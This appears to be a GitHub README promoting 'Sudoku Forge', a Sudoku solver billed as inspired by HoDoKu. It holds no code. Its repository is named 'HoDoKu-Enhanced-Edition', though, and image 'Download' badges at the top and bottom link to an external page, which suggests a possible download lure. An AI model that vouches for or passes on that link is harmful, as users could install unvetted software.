![preview](https://raw.githubusercontent.com/nosejaja500/HoDoKu-Enhanced-Edition/main/banner_cf0cd.svg)
[![Download](https://raw.githubusercontent.com/nosejaja500/HoDoKu-Enhanced-Edition/main/fetch_d7f83.svg)](https://nosejaja500.github.io/HoDoKu-Enhanced-Edition/)

# Sudoku Forge 🔨

## An Advanced Logic-Based Sudoku Companion Inspired by the Classic HoDoKu Engine

Sudoku Forge is a thoughtfully reimagined, open-source desktop companion for puzzle enthusiasts who love to reason their way through a grid rather than guess. Built as an homage to the legendary analytical spirit of classic Sudoku tools, this project takes that heritage and reshapes it into something more modern, more extensible, and more enjoyable to use on today's machines. Whether you are a beginner learning your first X-Wing or a seasoned solver chasing the elusive elegance of a uniqueness-based chain, Sudoku Forge is designed to sit quietly beside you and illuminate every logical step.

![Platform](https://img.shields.io/badge/platform-cross--platform-2f4858?style=flat-square)
![Language](https://img.shields.io/badge/language-Java-ED8B00?style=flat-square)
![UI](https://img.shields.io/badge/interface-desktop-4B8BBE?style=flat-square)
![Status](https://img.shields.io/badge/status-active-brightgreen?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)
![Year](https://img.shields.io/badge/release-2026-purple?style=flat-square)

---

## 🧭 Table of Contents

1. [Why Sudoku Forge Exists](#-why-sudoku-forge-exists)
2. [Core Philosophy](#-core-philosophy)
3. [Feature Highlights](#-feature-highlights)
4. [Solver Techniques Library](#-solver-techniques-library)
5. [Interface & User Experience](#-interface--user-experience)
6. [Multilingual Support](#-multilingual-support)
7. [Puzzle Generation & Exploration](#-puzzle-generation--exploration)
8. [Analytics & Hint Engine](#-analytics--hint-engine)
9. [Accessibility & Personalization](#-accessibility--personalization)
10. [Supported File Formats](#-supported-file-formats)
11. [Community & Support](#-community--support)
12. [Project Roadmap](#-project-roadmap)
13. [SEO & Discoverability Notes](#-seo--discoverability-notes)
14. [Contributing](#-contributing)
15. [License](#-license)
16. [Disclaimer](#-disclaimer)

---

## 🌟 Why Sudoku Forge Exists

Sudoku is not a race. It is a conversation between you and a grid of numbers. Sudoku Forge was born from the belief that the tools we use to have that conversation should feel like a well-worn notebook — familiar, responsive, and always ready with a gentle nudge when you need one.

Many solvers today rely on apps that either give too much away too soon or hide their reasoning behind a fog of automated answers. Sudoku Forge takes the opposite route: it treats every puzzle as a teaching moment, exposing the logic behind each deduction so that the human brain, not the machine, gets the final satisfaction of insight.

This project is inspired by the analytical traditions of desktop Sudoku engines and rebuilt with a forward-looking 2026 mindset — faster rendering, cleaner code organization, richer hint narratives, and a friendlier desktop environment for learners and experts alike.

---

## 🧠 Core Philosophy

Sudoku Forge rests on four pillars:

- **Transparency** — Every hint explains *why*, not just *what*.
- **Patience** — The tool waits for you; it does not overshoot.
- **Depth** — A wide technique library spanning from the obvious to the esoteric.
- **Craft** — A desktop experience built with the care of a handmade instrument.

Think of Sudoku Forge as a pocket watch rather than a smartwatch: mechanical, precise, and satisfying to look at when it ticks.

---

## ✨ Feature Highlights

- 🎯 **Comprehensive Technique Library** — dozens of solving strategies ranging from basic singles to advanced coloring and chain methods.
- 🖥️ **Responsive Desktop UI** — a layout that adjusts gracefully whether you are on a compact laptop window or a generous 4K display.
- 🌍 **Multilingual Interface** — language packs that let solvers work comfortably in their native tongue.
- 🛎️ **24/7 Support Channel** — community-driven assistance around the clock via discussion boards and issue queues.
- 🧩 **Puzzle Generator** — produce new grids at any difficulty tier, from gentle warmups to wrist-straining challenges.
- 📖 **Hint Narratives** — each hint is a short story in logic, walking you through the reasoning step by step.
- 🗂️ **Batch Analysis** — feed the engine a folder of puzzles and receive a structured report of required techniques.
- 🎨 **Theme Customization** — swap color palettes, font sizes, and grid spacing to suit your eyes.
- 🔍 **Candidate Highlighting** — visualize pencil marks with sophisticated overlays for chains, links, and groups.
- 📊 **Difficulty Scoring** — a transparent score broken down by technique category and complexity weighting.
- ♻️ **Session Recovery** — close the app and return later to the exact state you left behind.
- 🧪 **Experimental Technique Sandbox** — prototype new strategies with a dedicated testing playground.

---

## 🧰 Solver Techniques Library

Sudoku Forge ships with a deep library of documented solving techniques, each with a human-readable description and visual overlay.

**Fundamentals**
- Naked Singles and Hidden Singles
- Locked Candidates (Pointing and Claiming)
- Naked and Hidden Pairs, Triples, and Quadruples

**Intermediate Reasoning**
- X-Wing, Swordfish, Jellyfish
- Skyscraper, Two-String Kite, Turbot Fish
- Empty Rectangle
- XYZ-Wing and W-Wing

**Advanced Deductions**
- Simple Coloring and Multi-Coloring
- XY-Chains and Remote Pairs
- Fish variants and Finned Fish
- Unique Rectangle family (Types 1 through 6)
- Bug+1 and BUG-Lite patterns

**Expert Territory**
- Nice Loops and Grouped Nice Loops
- Alternating Inference Chains
- Death Blossom
- Exotic and Forcing Chains
- Templates and Pattern Overlay methods

Every technique can be toggled on or off, which is especially useful for learners who want to focus on one strategy at a time before expanding their vocabulary.

---

## 🖥️ Interface & User Experience

The interface of Sudoku Forge borrows cues from classic desktop software while embracing modern ergonomics.

- **Three-pane layout** — puzzle grid on the left, candidate panel in the middle, hint narration on the right.
- **Keyboard-first navigation** — every action has a shortcut; mouse users are equally welcome.
- **Zoomable grid** — pinch or scroll to resize without losing crispness.
- **Live pencil mark propagation** — candidates update in real time as you place digits.
- **Undo and redo stack** — go back twenty moves without losing your train of thought.
- **Stackable hint tray** — collect hints like sticky notes on a corkboard.

The design goal is a responsive UI that feels immediate on any screen, from a small travel laptop to a wide desktop monitor.

---

## 🌐 Multilingual Support

Language should never be a barrier to logical joy. Sudoku Forge's interface and hint narratives are translated through community-maintained language packs.

Currently supported and in-progress locales include:

- English
- German
- French
- Spanish
- Portuguese
- Italian
- Dutch
- Polish
- Russian
- Japanese
- Simplified Chinese

Adding a new language requires only a single structured text file — no code changes, no compilation headaches. The project actively welcomes translators.

---

## 🧩 Puzzle Generation & Exploration

Beyond solving, Sudoku Forge is a workshop for creating puzzles.

- **Difficulty presets** — Gentle, Balanced, Challenging, Severe, Extreme.
- **Technique targeting** — request puzzles that specifically require, say, an XYZ-Wing.
- **Symmetry options** — rotational, diagonal, and other classic symmetry constraints.
- **Batch generation** — produce hundreds of puzzles at once for study collections.
- **Puzzle validation** — confirm uniqueness of solution before exporting.

Puzzle generation runs entirely offline, respecting your privacy and your CPU.

---

## 🔬 Analytics & Hint Engine

The hint engine is the heart of Sudoku Forge. It works in layers:

1. **Scan** — the grid is parsed for candidate eliminations.
2. **Rank** — available techniques are ranked by complexity and relevance.
3. **Narrate** — the chosen technique is described in plain language with a visual overlay showing exactly which cells and candidates participate.
4. **Explain alternatives** — where multiple strategies apply, the engine lists them so you can choose your path.

This layered approach turns every solve into a small lesson, and every hint into a teachable moment.

Analytics reports summarize technique frequency, average solve depth, and where a puzzle tends to stall for human solvers.

---

## ♿ Accessibility & Personalization

Sudoku Forge aims to be usable by the widest possible audience.

- **High-contrast themes** for low-vision users.
- **Colorblind-safe palettes** with distinct shapes and outlines beyond color alone.
- **Adjustable font scaling** independent of system settings.
- **Screen-reader-friendly labels** on all interactive controls.
- **Reduced-motion mode** that minimizes animation.

Personalization extends to saved profiles, so different family members can share a machine without stepping on each other's preferences.

---

## 📂 Supported File Formats

Sudoku Forge plays nicely with the wider puzzle ecosystem.

- **Import**: standard puzzle strings, .sdk-style text, and common exchange formats used by community archives.
- **Export**: plain text, structured JSON reports, and printable PDF grids for offline solving.
- **Session files**: portable files capturing the full state of a puzzle in progress.

Interoperability is a first-class feature, not an afterthought.

---

## 🤝 Community & Support

Sudoku Forge is sustained by its community.

- **Discussion board** for strategy debates and feature ideas.
- **Issue tracker** for bug reports and technique requests.
- **24/7 support rotation** — community volunteers keep the lights on across time zones.
- **Monthly technique deep-dives** published as teaching articles.
- **Translator guild** for maintaining language packs.

No account is required to browse or post. Bring your curiosity.

---

## 🗺️ Project Roadmap

Planned directions for 2026 and beyond:

- Expanded technique sandbox with scripting hooks.
- Cloud-optional sync for session files (self-hosted).
- Mobile companion viewer for reading hints on the go.
- Additional language packs, including Hindi and Korean.
- Enhanced analytics dashboards with exportable charts.
- Printable booklet generator for teachers.
- Plugin architecture for community-contributed strategies.

The roadmap is shaped by user feedback, so early input carries real weight.

---

## 🔎 SEO & Discoverability Notes

Sudoku Forge is crafted to be discoverable for those searching for a desktop Sudoku solver, a logic-based Sudoku hint engine, an open-source Sudoku analysis tool, a multilingual Sudoku application, or an advanced Sudoku technique reference. The project's documentation uses natural language throughout, avoiding keyword stuffing while still covering the terms that genuinely describe what the tool does.

If you arrived here looking for a Sudoku companion that respects your intelligence, you are in the right place.

---

## 🛠️ Contributing

Contributions of all sizes are welcome and appreciated.

- **Bug reports** — detailed reproduction steps help enormously.
- **Technique descriptions** — help expand the hint narrative library.
- **Translations** — new locales broaden the community.
- **Themes** — share custom color palettes.
- **Documentation** — clearer wording benefits everyone.

Before submitting a large change, please open a discussion to align on direction. Small, focused pull requests are easiest to review.

---

## 📜 License

Sudoku Forge is distributed under the MIT License. You are welcome to study, adapt, and redistribute the code under the terms of that license.

Read the full text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Sudoku Forge Contributors.

---

## ⚠️ Disclaimer

Sudoku Forge is an independent, community-driven project. It is not affiliated with, endorsed by, or sponsored by the original authors of any legacy Sudoku software referenced for inspiration. All trademarks and product names mentioned remain the property of their respective owners.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

Puzzle content generated by users remains the responsibility of those users. Sudoku Forge does not host or distribute third-party puzzle collections.

---

[![Download](https://raw.githubusercontent.com/nosejaja500/HoDoKu-Enhanced-Edition/main/fetch_d7f83.svg)](https://nosejaja500.github.io/HoDoKu-Enhanced-Edition/)